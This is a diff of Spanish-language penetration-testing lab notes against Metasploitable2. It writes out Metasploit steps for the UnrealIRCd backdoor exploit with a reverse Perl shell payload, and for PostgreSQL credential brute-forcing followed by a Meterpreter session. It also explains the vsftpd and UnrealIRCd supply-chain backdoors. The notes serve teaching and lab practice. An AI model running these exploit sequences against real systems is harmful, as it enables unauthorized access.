@@ -285,22 +285,24 @@ exploit
 ```bash
 # 1
 msfconsole
+
 # 2
 search ircd
+
 # 3
 use exploit/unix/irc/unreal_ircd_3281_backdoor
+
 # 4 
 show payloads
 set payload cmd/unix/reverse_perl
+
 # 5
 exploit
 ```
-
+![](attachments/Pasted%20image%2020260714184917.png)
 ### ¿Por qué se consideran backdoors y no vulnerabilidades?
 
 Se consideran **backdoors** y no vulnerabilidades porque el código malicioso fue **introducido intencionalmente** en el tarball de descarga oficial del software por un atacante que compromise el servidor de distribución (supply chain attack). No se trata de un error de programación o diseño (vulnerabilidad), sino de una **puerta trasera deliberada** que permite acceso no autorizado. En el caso de vsftpd, el código backdoorizado responde a un username con `:)` abriendo un shell root. En UnrealIRCd, se insertó un macro `DEBUG3_DOLOG_SYSTEM` que ejecuta comandos del sistema. Ambos fueron descubiertos por la comunidad tras detectar comportamientos anómalos en los binarios distribuidos [^9] [^11].
-
----
 
 ## Ejercicio 7 — Módulos auxiliares — PostgreSQL
 
@@ -315,8 +317,6 @@ msfconsole
 
 # 3. Fuerza bruta de credenciales PostgreSQL
 use auxiliary/scanner/postgres/postgres_login
-set RHOSTS <IP_VICTIMA>
-set RPORT 5432
 set USER_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt
 set PASS_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt
 set VERBOSE false
@@ -326,8 +326,6 @@ run
 #    y obtener sesión interactiva con Meterpreter
 #    NOTA: En Metasploitable2, las credenciales son postgres:postgres
 use exploit/linux/postgres/postgres_payload
-set RHOSTS <IP_VICTIMA>
-set RPORT 5432
 set USERNAME postgres
 set PASSWORD postgres
 set DATABASE template1
@@ -347,7 +345,7 @@ query 'SELECT version();'
 query 'SELECT inet_server_addr();'
 ```
 
----
+![](attachments/{6D6DE5B3-9789-40B9-8D69-C63462B0FEE4}.png)
 
 ## Ejercicio 8 — Módulos auxiliares — FTP y VNC Server
 
